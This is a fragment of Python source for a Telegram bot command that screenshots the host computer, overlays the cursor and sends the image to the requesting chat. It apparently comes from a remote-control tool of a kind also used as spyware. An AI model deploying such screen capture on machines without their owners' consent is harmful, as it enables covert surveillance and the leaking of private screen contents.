@bot.message_handler(commands=["capture"])
def capture_pc(message):
    bot.send_chat_action(message.chat.id, 'upload_photo')
    try:
        currentMouseX, currentMouseY = mouse.get_position()
        img = ImageGrab.grab()
        img.save("screen.png", "png")
        img = Image.open("screen.png")
        draw = ImageDraw.Draw(img)
        draw.polygon(
            (currentMouseX, currentMouseY, currentMouseX, currentMouseY + 15, currentMouseX + 10, currentMouseY + 10),
            fill="white", outline="black")
        img.save("screen_with_mouse.png", "PNG")
        bot.send_photo(message.chat.id, open("screen_with_mouse.png", "rb"))
        os.remove("screen.png")
        os.remove("screen_with_mouse.png")
    except:
        bot.send_message(message.chat.id, "Компьютер заблокирован")

